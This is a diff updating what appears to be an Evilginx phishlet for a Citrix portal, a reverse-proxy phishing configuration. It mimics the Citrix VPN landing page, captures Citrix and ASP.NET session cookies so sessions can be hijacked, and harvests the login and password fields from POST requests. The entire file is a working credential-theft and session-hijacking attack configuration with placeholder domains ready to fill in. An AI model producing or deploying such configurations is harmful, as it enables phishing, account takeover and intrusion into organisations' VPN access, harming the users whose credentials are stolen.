@@ -1,18 +1,21 @@
 name: 'Citrix Portal'
 author: '@424f424f'
-min_ver: '2.1.0'
+min_ver: '2.2.0'
 proxy_hosts:
   - {phish_sub: 'subdomainhere', orig_sub: 'subdomainhere', domain: 'domainhere', session: true, is_landing: true}
 sub_filters:
-  - {hostname: 'domainhere', sub: 'subdomainhere', domain: 'domainhere', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'domainhere', orig_sub: 'subdomainhere', domain: 'domainhere', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: 'domainhere'
     keys: ['ASP.NET_SessionId','CsrfToken','NSC_AAAC','NSC_DLGE','pwcount']
-user_regex:
-  key: 'login'
-  re: '(.*)'
-pass_regex:
-  key: 'passwd'
-  re: '(.*)'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
 landing_path:
   - '/vpn/index.html'
